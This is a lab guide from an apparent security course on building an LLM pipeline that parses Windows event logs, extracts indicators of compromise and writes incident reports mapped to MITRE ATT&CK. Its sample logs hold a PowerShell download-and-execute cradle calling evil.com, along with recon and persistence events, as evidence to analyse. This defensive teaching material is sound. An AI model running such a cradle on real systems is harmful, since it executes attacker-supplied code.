# Lab 04: LLM-Powered Security Log Analysis

Use Large Language Models to analyze, correlate, and explain security logs.

---

## 🎯 Learning Objectives

By completing this lab, you will:

1. Use LLMs to parse and normalize log data
2. Build prompts for security analysis
3. Extract IOCs and threat indicators from logs
4. Generate human-readable incident summaries
5. Map findings to MITRE ATT&CK framework

---

## ⏱️ Estimated Time

60-90 minutes

---

## 📋 Prerequisites

- Completed Labs 01-03
- Anthropic API key or Ollama installed
- Basic understanding of Windows Event Logs

### Required Libraries

```bash
pip install langchain langchain-anthropic python-dotenv rich
```

---

## 📖 Background

Security logs are goldmines of information but overwhelming in volume. LLMs can help:

- **Parse** complex log formats automatically
- **Correlate** events across different log sources
- **Explain** what happened in plain English
- **Prioritize** which events need attention
- **Recommend** response actions

### Common Log Sources

| Log Source | Windows Event ID | What It Shows               |
| ---------- | ---------------- | --------------------------- |
| Security   | 4624             | Successful logon            |
| Security   | 4625             | Failed logon                |
| Security   | 4688             | Process creation            |
| Security   | 4698             | Scheduled task created      |
| PowerShell | 4104             | Script block logging        |
| Sysmon     | 1                | Process creation (detailed) |
| Sysmon     | 3                | Network connection          |

---

## 🔬 Lab Tasks

### Task 1: Set Up LLM Client (10 min)

Configure your LLM client in `starter/main.py`:

```python
def setup_llm():
    """
    Initialize the LLM client.

    TODO:
    1. Load API key from environment
    2. Create ChatAnthropic or Ollama client
    3. Test with a simple message
    4. Return the client

    Options:
    - Anthropic: ChatAnthropic(model="claude-sonnet-4-20250514")
    - Ollama: ChatOllama(model="llama3.1:8b")
    """
    pass
```

### Task 2: Log Parser Agent (20 min)

Build an LLM-powered log parser:

```python
def parse_log_entry(llm, log_entry: str) -> dict:
    """
    Use LLM to parse a raw log entry into structured data.

    Args:
        llm: Language model client
        log_entry: Raw log text

    Returns:
        Structured dict with:
        - timestamp: When it happened
        - event_type: What type of event
        - source: Where it came from
        - user: Who was involved
        - details: Key details
        - severity: Estimated severity (1-10)

    TODO:
    1. Create a prompt that instructs the LLM to:
       - Identify the log format
       - Extract key fields
       - Return structured JSON
    2. Parse the LLM response
    3. Return the structured data
    """
    pass
```

**Sample Input:**

```
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2024-01-15T03:24:15.123Z"/>
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c whoami</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="SubjectUserName">jsmith</Data>
  </EventData>
</Event>
```

**Expected Output:**

```json
{
  "timestamp": "2024-01-15T03:24:15.123Z",
  "event_type": "Process Creation",
  "event_id": 4688,
  "source": "WORKSTATION01",
  "user": "jsmith",
  "details": {
    "process": "cmd.exe",
    "command_line": "cmd.exe /c whoami",
    "parent_process": "powershell.exe"
  },
  "severity": 6
}
```

### Task 3: Threat Detection Analyzer (20 min)

Build an analyzer that identifies suspicious patterns:

```python
def analyze_logs_for_threats(llm, logs: List[dict]) -> dict:
    """
    Analyze a batch of logs for security threats.

    Args:
        llm: Language model client
        logs: List of parsed log entries

    Returns:
        Analysis dict with:
        - threats_detected: List of identified threats
        - iocs: Extracted indicators of compromise
        - mitre_mapping: Relevant ATT&CK techniques
        - timeline: Sequence of events
        - severity: Overall severity assessment
        - recommendations: Suggested actions

    TODO:
    1. Format logs for LLM context
    2. Create analysis prompt with security focus
    3. Ask LLM to identify:
       - Suspicious patterns
       - Attack techniques
       - IOCs (IPs, domains, hashes, etc.)
    4. Map to MITRE ATT&CK
    5. Generate recommendations
    """
    pass
```

### Task 4: IOC Extractor (15 min)

Extract indicators of compromise:

```python
def extract_iocs(llm, text: str) -> dict:
    """
    Extract IOCs from log data or incident text.

    Returns:
        {
            "ips": ["192.168.1.100", ...],
            "domains": ["evil.com", ...],
            "urls": ["http://...", ...],
            "hashes": {"md5": [], "sha256": []},
            "file_paths": ["C:\\Windows\\...", ...],
            "usernames": ["admin", ...],
            "emails": ["attacker@...", ...]
        }

    TODO:
    1. Create extraction prompt
    2. Parse LLM response into categories
    3. Validate extracted IOCs (format check)
    4. Remove duplicates
    """
    pass
```

### Task 5: Incident Summary Generator (15 min)

Generate executive-friendly summaries:

```python
def generate_incident_summary(llm, analysis: dict) -> str:
    """
    Generate a human-readable incident summary.

    Args:
        analysis: Output from analyze_logs_for_threats()

    Returns:
        Markdown-formatted summary including:
        - Executive summary (2-3 sentences)
        - What happened (timeline)
        - Impact assessment
        - IOCs for blocking
        - Recommended actions
        - MITRE ATT&CK mapping

    TODO:
    1. Create summary prompt
    2. Include all relevant context
    3. Format output in readable markdown
    """
    pass
```

### Task 6: Complete Pipeline (10 min)

Wire everything together:

```python
def analyze_security_incident(log_data: str) -> str:
    """
    Complete pipeline: Parse → Analyze → Summarize.

    Args:
        log_data: Raw log data (multiple entries)

    Returns:
        Complete incident report
    """
    pass
```

---

## 📁 Files

```
lab04-llm-log-analysis/
├── README.md
├── starter/
│   └── main.py
├── solution/
│   └── main.py
├── data/
│   ├── sample_logs.txt      # Sample Windows logs
│   ├── attack_scenario.txt  # Multi-stage attack logs
│   └── benign_logs.txt      # Normal activity logs
└── prompts/
    ├── parser_prompt.txt
    ├── analyzer_prompt.txt
    └── summary_prompt.txt
```

---

## 📝 Sample Log Data

```
# PowerShell execution (Event ID 4104)
2024-01-15 03:22:10 | WORKSTATION01 | PowerShell | 4104 | Script Block:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Process Creation (Event ID 4688)
2024-01-15 03:22:15 | WORKSTATION01 | Security | 4688 |
User: CORP\jsmith | Process: cmd.exe | CommandLine: cmd.exe /c whoami
Parent: powershell.exe

# Network Connection (Sysmon Event ID 3)
2024-01-15 03:22:20 | WORKSTATION01 | Sysmon | 3 |
Process: powershell.exe | DestinationIP: 185.143.223.47 | DestinationPort: 443

# Scheduled Task (Event ID 4698)
2024-01-15 03:25:00 | WORKSTATION01 | Security | 4698 |
User: CORP\jsmith | TaskName: \Microsoft\Windows\Maintenance\update
Command: C:\Users\Public\malware.exe
```

---

## ✅ Success Criteria

- [ ] LLM client initializes correctly
- [ ] Log parser extracts all key fields
- [ ] Threat analyzer identifies attack patterns
- [ ] IOC extractor finds all indicators
- [ ] Summary is clear and actionable
- [ ] MITRE ATT&CK techniques correctly identified

---

## 🎯 Expected Analysis Output

```markdown
# Security Incident Report

## Executive Summary

A multi-stage attack was detected on WORKSTATION01 starting at 03:22 UTC.
The attacker used PowerShell to download and execute malicious code,
performed reconnaissance, and established persistence via scheduled task.

## Timeline

1. 03:22:10 - PowerShell downloads payload from evil.com
2. 03:22:15 - Reconnaissance command (whoami) executed
3. 03:22:20 - C2 connection to 185.143.223.47:443
4. 03:25:00 - Persistence established via scheduled task

## MITRE ATT&CK Mapping

- T1059.001 - PowerShell
- T1105 - Ingress Tool Transfer
- T1033 - System Owner/User Discovery
- T1053.005 - Scheduled Task

## Indicators of Compromise

- Domain: evil.com
- IP: 185.143.223.47
- File: C:\Users\Public\malware.exe

## Recommendations

1. IMMEDIATE: Isolate WORKSTATION01 from network
2. Block evil.com and 185.143.223.47 at firewall
3. Remove scheduled task and malware.exe
4. Reset credentials for jsmith
5. Scan other endpoints for same IOCs
```

---

## 💡 Prompt Engineering Tips

### Good Prompts Include:

1. **Role**: "You are a senior security analyst..."
2. **Context**: "Analyzing Windows Event Logs from a corporate network..."
3. **Task**: "Identify suspicious activities and extract IOCs..."
4. **Format**: "Return your analysis as JSON with these fields..."
5. **Examples**: Show expected input/output format

### Example System Prompt:

```
You are an expert security analyst specializing in Windows log analysis
and incident response. You have deep knowledge of:
- Windows Event IDs and their security implications
- MITRE ATT&CK framework
- Common attack patterns and TTPs
- IOC extraction and threat intelligence

When analyzing logs:
1. Look for suspicious patterns across multiple events
2. Identify the attack chain if present
3. Extract all indicators of compromise
4. Map activities to MITRE ATT&CK techniques
5. Provide actionable recommendations

Always be specific and cite evidence from the logs.
```

---

## 🚀 Bonus Challenges

1. **Streaming Analysis**: Process logs in real-time as they arrive
2. **Multi-Source Correlation**: Combine Windows, Sysmon, and network logs
3. **Confidence Scoring**: Rate confidence in each finding
4. **False Positive Detection**: Identify likely false positives
5. **Automated Response**: Generate containment scripts

---

## 📚 Resources

### External Resources
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Windows Security Event IDs](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
- [Sysmon Configuration](https://github.com/SwiftOnSecurity/sysmon-config)
- [LangChain Documentation](https://python.langchain.com/docs/)

### Related Guides
- [Structured Output Parsing](../../setup/guides/structured-output-parsing.md) - Parse LLM JSON reliably
- [Prompt Injection Defense](../../setup/guides/prompt-injection-defense.md) - Protect against adversarial inputs in logs
- [LLM Evaluation & Testing](../../setup/guides/llm-evaluation-testing.md) - Test your log analyzer's accuracy

---

> **Stuck?** See the [Lab 04 Walkthrough](../../docs/walkthroughs/lab04-walkthrough.md) for step-by-step guidance.

**Next Lab**: [Lab 05 - Threat Intelligence Agent](../lab05-threat-intel-agent/)
